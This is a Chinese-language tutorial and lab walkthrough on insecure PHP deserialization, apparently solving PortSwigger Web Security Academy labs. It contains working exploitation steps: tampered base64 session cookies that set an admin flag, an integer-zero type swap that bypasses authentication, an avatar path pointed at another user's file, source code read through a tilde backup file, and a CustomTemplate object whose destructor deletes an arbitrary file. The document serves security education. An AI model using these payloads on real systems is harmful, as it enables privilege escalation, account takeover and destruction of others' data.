# 不安全的反序列化

**什么是序列化？**

**序列化**是将复杂数据结构（如对象及其字段）转换为"扁平化"格式的过程，这种格式可转换为连续的字节流，便于发送与接收。通过序列化数据，我们可以更便捷地实现以下操作：

- 将复杂数据写入进程间内存、文件或数据库
- 在网络传输、应用程序不同组件间通信或API调用时传递复杂数据

关键在于，序列化对象时其状态也会被持久化。换句话说，对象属性及其赋值都会被完整保留。



**反序列化**

**反序列化**是将字节流恢复为原始对象的完整功能副本的过程，其状态与序列化时完全一致。网站逻辑随后可与该反序列化对象交互，如同操作其他普通对象。



不安全反序列化指网站对用户可控数据进行反序列化处理。攻击者可借此篡改序列化对象，向应用代码注入有害数据。

攻击者甚至能以完全不同的类对象替换序列化对象。令人担忧的是，无论预期接收何种类，网站所有可用类的对象都将被反序列化并实例化。正因此，不安全反序列化有时被称为"对象注入"漏洞。

接收意外类对象可能引发异常，但此时损害往往已造成。许多基于反序列化的攻击在反序列化完成**前**即告终结。这意味着即便网站功能未直接与恶意对象交互，反序列化过程本身就可能触发攻击。



该漏洞通常源于对"反序列化用户可控数据"危险性的普遍认知缺失。理想情况下，应完全避免反序列化用户输入。



## 识别漏洞

无论采用白盒测试还是黑盒测试，识别不安全反序列化漏洞都相对简单。

在审计过程中，您应当审查所有传入网站的数据流，尝试识别任何呈现序列化数据特征的内容。若熟悉不同编程语言的序列化格式，识别这类数据将事半功倍。一旦发现序列化数据，即可测试其可控性。



### PHP序列化格式

PHP采用类自然语言的字符串序列化格式，字母表示数据类型，数字表示条目长度。例如某个包含以下属性的`User`对象：

```
$user->name = "carlos"; $user->isLoggedIn = true;
```

序列化后呈现如下形式：

```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```



各字段含义解析：

- `O:4:"User"`：表示一个类名为`"User"`（4字符）的对象
- `2`：对象包含2个属性
- `s:4:"name"`：第一个属性的键是4字符字符串`"name"`
- `s:6:"carlos"`：第一个属性的值是6字符字符串`"carlos"`
- `s:10:"isLoggedIn"`：第二个属性的键是10字符字符串`"isLoggedIn"`
- `b:1`：第二个属性的布尔值为`true`



注：**不同 PHP 版本序列化后的呈现形式可能不同**，PHP原生序列化方法为`serialize()`与`unserialize()`。若具备源码访问权限，建议优先在代码中检索`unserialize()`方法并深入分析。



## 修改对象属性

某些反序列化漏洞的利用可能如同"改数据"般简单，攻击者只需篡改序列化对象中的特定属性值即可得手。由于对象状态采用持久化存储机制，攻击者可通过逆向分析序列化数据结构，精准定位并篡改核心参数（如权限标识位），随后借助系统的反序列化流程注入恶意对象。



在篡改数据时，只要攻击者保持有效的序列化对象结构，反序列化过程就会生成带有篡改属性值的服务端对象。以一个典型场景为例：某网站使用序列化的`User`对象将用户会话数据存储在cookie中。假设攻击者在HTTP请求中发现如下经过编码的序列化对象：

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czo3OiJpc0FkbWluIjtiOjA7fQ0K
```

```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```



假设网站通过该cookie校验用户是否具有管理员权限，其中 `isAdmin` 属性显然是关键攻击点。攻击者只需将该属性的布尔值改为`1`（真），重新编码对象并用此篡改值覆盖当前cookie即可。

```
$user = unserialize($_COOKIE); 
if ($user->isAdmin === true) { 
    // 允许访问管理界面 
}
```

这段存在漏洞的代码会根据cookie数据实例化`User`对象，包含攻击者篡改的`isAdmin`属性值。整个过程中系统从未验证序列化对象的真实性。篡改后的数据进入条件判断后，将直接导致权限提升漏洞。



**实验**

该实验室采用了基于序列化的会话机制，因此存在权限提升漏洞。要解决该实验，请通过修改会话Cookie中的序列化对象来利用此漏洞获取管理员权限，然后删除用户carlos。



在网站中输入账号密码后，使用 BurpSuite 抓取 HTTP 请求，查看其 Cookie 内容：

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3D
```



Cookie 内容使用 Base64 编码和 URL 编码，首先进行 URL 解码，再进行 Base64 解码后得到以下内容：

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

各字段含义解析：

- `O:4:"User"`：表示一个类名为`"User"`（4字符）的序列化对象
- `2`：对象包含2个属性
- `s:8:"username"`：第一个属性的键是8字符字符串`"username"`
- `s:6:"wiener"`：第一个属性的值是6字符字符串`"wiener"`
- `s:5:"admin"`：第二个属性的键是5字符字符串`"admin"`
- `b:0`：第二个属性的布尔值为`false`



要将服务器识别为用户权限为管理员，需修改User类中第二个属性"admin"的布尔值：将原始值false（对应0）更改为true（对应1）。修改后的序列化数据示例如下：

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```



修改后的反序列化数据需依次执行两步编码操作：首先对序列化字符串进行 **base64 编码**；接着对 base64 结果进行 **URL 编码**。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D
```



当携带未经篡改的标准 Cookie 值向服务器发起 **`/admin` 路径请求**时，服务器会返回 **HTTP 401 Unauthorized** 状态码（权限不足），证明当前身份未通过管理端鉴权。

```
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2587
```

![image-20250317112007108](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317112007108.png)



将篡改后的 Cookie 值替换原始数据并重新请求 **`/admin`** 路径后，服务器返回**管理员专属页面**（HTTP 200），验证了通过反序列化漏洞成功将用户权限提升为管理员。

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3104
```

![image-20250317112141810](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317112141810.png)



将 URL 路径修改为 `/admin/delete?username=carlos` 后重新发送 HTTP 请求，成功删除 carlos 用户。

![image-20250317112442252](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317112442252.png)



## 数据类型篡改

我们已了解如何修改序列化对象中的属性值，但攻击者还可能通过注入异常数据类型实施攻击。由于PHP松散比较运算符（`==`）在处理不同类型数据时的特殊行为，基于PHP的逻辑尤其容易受到此类篡改攻击。



当比较整型与字符串时，PHP会尝试将字符串转换为整型。例如，`5 == "5"`会被判定为`true`。值得注意的是，对于任何以数字开头的字母数字字符串，这种行为同样适用。此时PHP会将整个字符串转换为基于初始数字的整型值，后续字符会被完全忽略。因此，`5 == "5 of something"`实际上会被视为`5 == 5`。

更特殊的是，在PHP 7.x及更早版本中，`0 == "Example string"`的比对结果会被判定为`true`，因为PHP会将整个字符串视为整型`0`。



当这种松散比较运算符与反序列化对象中用户可控的数据结合使用时，就可能产生危险的逻辑漏洞：

```
$login = unserialize($_COOKIE);
if ($login['password'] == $password) { // 登录成功 }
```

假设攻击者将密码属性从字符串篡改为整型`0`。只要存储的真实密码不以数字开头，该条件将始终返回`true`，从而实现认证绕过。值得注意的是，这种攻击之所以可能，是因为反序列化过程会保留数据类型。若代码直接从请求中获取密码，`0`会被转换为字符串，此时条件判断将返回`false`。



**特别说明**

在PHP 8及更高版本中，`0 == "Example string"`的比对结果会被判定为`false`，因为PHP不再在比较时将字符串隐式转换为`0`。因此该漏洞在PHP 8+环境中不可复现。

但以数字开头的字母数字字符串比较行为在PHP 8中保持不变，即`5 == "5 of something"`仍然会被视为`5 == 5`。

需要特别注意的是，在修改任何序列化对象格式的数据类型时，务必记得同时更新序列化数据中的任何类型标签和长度指示符。否则序列化对象将损坏，导致反序列化失败。



**实验**

该实验室采用基于序列化的会话机制，因此存在身份验证绕过漏洞。要完成该实验，请编辑会话Cookie中的序列化对象以访问`administrator`管理员账户，随后删除用户`carlos`。

您可以使用以下凭证登录自己的账户：`wiener:peter`



在浏览器上登录账户后使用 BurpSuite 抓包查看 Cookie。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJiMjV0djVzMGpnZmRibGI1ZXNpdXN4aHpjbXpwMDMyOSI7fQ%3d%3d
```

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"b25tv5s0jgfdblb5esiusxhzcmzp0329";}
```



构造恶意的 Cookie，将 username 替换为 administrator，将 access_token 替换为整形 0，记得修改长度。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```



访问网站的 /admin 路径，并将 Cookie 设置为篡改后的。

![image-20250317155316338](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317155316338.png)



使用 BurpSuite 发送以下内容的 HTTP 请求即可删除 carlos 用户。

```
GET /admin/delete?username=carlos HTTP/2
Host: 0afd00f5037097f18078c10b00cb0007.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```



## 使用应用程序功能

除了简单地检查属性值之外，网站功能还可能对反序列化对象中的数据进行危险操作。在这种情况下，攻击者可以通过不安全的反序列化机制传入意外数据，并利用相关功能实施破坏。



例如，在某网站的"删除用户"功能中，系统会通过访问`$user->image_location`属性中的文件路径来删除用户的个人资料图片。如果这个`$user`对象是通过反序列化创建的，攻击者可以构造一个将`image_location`设置为任意文件路径的篡改对象。当他们删除自己的账户时，系统也会随之删除这个任意指定的文件。



**实验**

该实验室采用基于序列化的会话机制。某一功能会对序列化对象中提供的数据调用危险方法。要解决该实验室问题，请修改会话Cookie中的序列化对象，并利用它从Carlos的主目录中删除`morale.txt`文件。

您可以使用以下凭证登录自己的账户：`wiener:peter`

您还可以访问一个备份账户：`gregg:rosebud`



在浏览器上登录账户后使用 BurpSuite 抓包查看 Cookie。

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjdTJ1MHppazlua21mNnk1dGl1Y3ZzMGc5b2lhMnFvdCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30%3D
```

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"cu2u0zik9nkmf6y5tiucvs0g9oia2qot";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```



直接将 username 和 avatar_link 属性中的 wiener 替换为 carlos，token 保持不变，使用 BurpSuite 发送 HTTP 请求。

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjdTJ1MHppazlua21mNnk1dGl1Y3ZzMGc5b2lhMnFvdCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30%3D
```

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"cu2u0zik9nkmf6y5tiucvs0g9oia2qot";s:11:"avatar_link";s:19:"users/carlos/avatar";}
```



服务端返回 500 错误以及 PHP 的错误消息，错误消息中包含了 carlos 的真实 token。

```
PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username] = ibwhanrv502uul64mzn35af5n54o1z1v, $user-&gt;access_token = cu2u0zik9nkmf6y5tiucvs0g9oia2qot, $access_tokens = [ibwhanrv502uul64mzn35af5n54o1z1v, p4b76bemzfk4t07wubzd5rr1bnpk8el8, cu2u0zik9nkmf6y5tiucvs0g9oia2qot]) Invalid access token for user carlos in /var/www/index.php:8
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 8
```

用户 `carlos` 的 `access_token` 预期应为 `ibwhanrv502uul64mzn35af5n54o1z1v`（来自 `$access_tokens[$user->username]`）。

实际传入的 `$user->access_token` 是 `cu2u0zik9nkmf6y5tiucvs0g9oia2qot`，导致验证失败。

`$access_tokens` 数组包含三个令牌：

```
$access_tokens = [
  'ibwhanrv502uul64mzn35af5n54o1z1v',  // 用户 carlos 的令牌
  'p4b76bemzfk4t07wubzd5rr1bnpk8el8',  // 其他用户
  'cu2u0zik9nkmf6y5tiucvs0g9oia2qot'   // 其他用户
];
```



将 Cookie 中的 token 替换为 carlos 的 token 后重新发送 HTTP 请求，成功登录 carlos 账户。

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpYndoYW5ydjUwMnV1bDY0bXpuMzVhZjVuNTRvMXoxdiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30%3D
```

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"ibwhanrv502uul64mzn35af5n54o1z1v";s:11:"avatar_link";s:19:"users/carlos/avatar";}
```

![image-20250317131118418](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317131118418.png)



使用浏览器触发 Delete account 操作，通过 Burp Suite 拦截请求，获取 URL 路径，然后丢弃请求以防止账户被删除。

```
POST /my-account/delete HTTP/2
```



对象 **avatar_link** 属性存储用户头像存储的路径，当使用删除账号功能时，服务器会将用户的头像（即 **avatar_link** 属性中路径的文件）删除。只需要将 **avatar_link** 属性的内容设置为 **/home/carlos/morale.txt** ，服务器在删除用户时会一并删除该文件。

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpYndoYW5ydjUwMnV1bDY0bXpuMzVhZjVuNTRvMXoxdiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"ibwhanrv502uul64mzn35af5n54o1z1v";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

注：服务器在删除 avatar_link 路径中的文件时，并不会进行额外的校验。将 wiener 用户的 avatar_link 属性中的路径修改为 carlos 用户的文件（**/home/carlos/morale.txt**），在删除 wiener 用户时，服务器也会删除文件的。



此时只需要向删除账户的 URL 发送请求，并设置 Cookie 为篡改后的，即可删除当前用户，用户的文件 morale.txt 也会被一起删除。

```
POST /my-account/delete HTTP/2
Host: 0ac60091046b4c8680c8c610000b0075.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpYndoYW5ydjUwMnV1bDY0bXpuMzVhZjVuNTRvMXoxdiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```





## 魔术方法

魔术方法是一类无需显式调用的特殊方法。当特定事件或场景触发时，这些方法会自动执行。它们是面向对象编程（多种语言）中的常见特性，通常以双下划线（`__`）作为方法名的前缀或包裹符。



开发者可以通过在类中定义魔术方法，预先设定特定事件发生时需要执行的代码。不同魔术方法的触发时机和条件各不相同。例如，PHP 中的 `__construct()` 方法会在类的对象实例化时自动调用（类似于 Python 的 `__init__`），通常用于初始化实例属性。然而，开发者可以自由定制魔术方法中的代码逻辑。



魔术方法本身并不构成安全漏洞，但如果其执行的代码处理了攻击者可操控的数据（例如来自反序列化对象的数据），就可能引发风险。攻击者可利用此类特性，在满足条件时自动触发恶意方法。



**反序列化场景中的魔术方法**
 在此背景下，某些语言的魔术方法会在反序列化过程中被自动调用。例如：

- PHP 的 `unserialize()` 方法会查找并调用对象的 `__wakeup()` 魔术方法。



需重点关注包含此类魔术方法的类。它们允许在对象完全反序列化之前，将序列化数据传入网站代码中。这正是构造高阶漏洞利用的切入点。



## 任意对象注入攻击

通过简单地修改网站提供的序列化对象就有可能实现不安全的反序列化漏洞利用。但若能注入任意类型的对象，攻击者将获得更大的操作空间。

在面向对象编程中，对象可调用的方法由其所属类决定。因此，当攻击者能够控制反序列化过程中所传入对象的类时，就能直接影响反序列化期间及之后执行的代码逻辑。



反序列化方法通常不会对输入内容进行类型校验。这意味着只要网站类路径中存在可序列化的类，攻击者就可以构造该类的实例化对象进行反序列化操作。这种机制实质上允许攻击者创建任意类的实例——即使该对象类型与应用程序预期不符，也依然能够成功实例化。虽然非预期类型的对象可能会在后续应用逻辑中引发异常，但此时恶意对象早已完成初始化。

当攻击者掌握源代码时，可以深入研究所有可用类。为了构建基础攻击载荷，他们通常会寻找包含反序列化魔术方法（如__wakeup()、__destruct()等）的类，并核查这些方法是否会对可控数据执行危险操作。通过传入这类特殊构造的序列化对象，攻击者就能利用其魔术方法实现漏洞利用。

包含这类反序列化魔术方法的类还可以用于发起更复杂的攻击。攻击者通过构造多层级的方法调用链（称为"利用链"或"gadget chain"），能够将看似无害的操作串联成具有破坏性的攻击流程。这种攻击模式往往需要深入分析类与类之间的调用关系，最终形成多米诺骨牌式的漏洞触发链条。



**实验**

该实验采用基于序列化的会话机制，因此存在任意对象注入漏洞。为解决该实验，您需要创建并注入恶意序列化对象以删除Carlos主目录中的`morale.txt`文件。您需要获取源代码访问权限才能完成本实验。

您可以使用以下凭证登录自己的账户：`wiener:peter`



您有时可以通过在文件名后附加波浪号（`~`）来检索编辑器生成的备份文件，从而读取源代码。



登录账户，观察会话Cookie中包含一个序列化的PHP对象。

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJzZDkyaXY5eGU0d3Y4czB0czJzanRsNWR2dGsyN3V6OSI7fQ%3d%3d
```

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sd92iv9xe4wv8s0ts2sjtl5dvtk27uz9";}
```



在网站 **/my-account?id=wiener** 路径的源代码中，发现网站引用了文件`/libs/CustomTemplate.php`。

![image-20250317170042628](./images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250317170042628.png)



通过在请求行的文件名后添加波浪号（`~`）可读取源代码。

```
https://xxxx/libs/CustomTemplate.php~
```

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

观察源代码中的 `CustomTemplate` 类包含 `__destruct()` 魔术方法。该方法会调用 `unlink()` 函数，从而删除该 `lock_file_path` 属性路径下的文件。



使用正确的PHP序列化语法创建一个`CustomTemplate`对象，将其`lock_file_path`属性设置为`/home/carlos/morale.txt`。确保数据类型标签和长度指示符正确。最终生成的对象应如下：

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```



如果你想在序列化字符串中包含 template_file_path 属性，则可以使用下面的字符串：

```
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:0:"";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```



对该对象进行Base64编码和URL编码.

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D
```



在Burp Repeater中，用修改后的编码会话Cookie替换原始Cookie，请求路径为 **/my-account?id=wiener** 。发送请求。`__destruct()`魔术方法将自动触发，删除Carlos的文件。

```
GET /my-account?id=wiener HTTP/2
Host: 0a2000a7033a4f5c80ec8a67003a000c.web-security-academy.net
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D
```

